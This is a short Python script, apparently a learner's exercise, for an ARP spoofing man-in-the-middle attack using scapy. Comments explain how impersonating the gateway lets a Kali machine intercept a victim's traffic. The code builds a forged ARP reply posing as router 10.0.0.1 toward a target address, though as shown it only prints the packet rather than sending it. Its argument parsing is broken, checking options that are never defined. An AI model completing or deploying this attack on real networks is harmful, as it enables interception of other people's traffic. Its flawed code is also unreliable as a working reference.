# ARP spoofing is  allows a malicious machine to pretend to be another device by mimicking its ip address in the table
# of the gateway. This means the gateway will forward any requests meant for the victim to the malicious device. This is
# called a man in the middle attack


# A man in the middle machine running Kali will have to enable port forwarding to allow packets to continue to flow to
# from the victim machine to the required destination, but first going through the machine as to not reveal that the
# kali machine isn't actually a router

import optparse

import scapy.all as scapy

import net_scanner

def get_args():
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="target", help="Target IP for man in the middle")

    (options, arguments) = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify an ip pr ip range, use --help for more info")
    if not options.new_mac:
        options.target = "10.0.0.65/24"

    return options

def get_mac_address(ip):
    arp_req = net_scanner.arp_broadcast_request(ip)
    arp_resp = net_scanner.net_scan(arp_req)
    for resp in arp_resp:
        if resp.ip == ip:
            mac = resp.mac
    return mac

def spoof_arp(target_ip):
    # args = get_args()
    # target_ip = args.target
    target_mac = get_mac_address(target_ip)
    # router_ip = get_router_ip()
    router_ip = "10.0.0.1"
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = router_ip)
    print(packet.summary())

if __name__ == '__main__':
    print("Game Over")
    spoof_arp("10.0.0.5")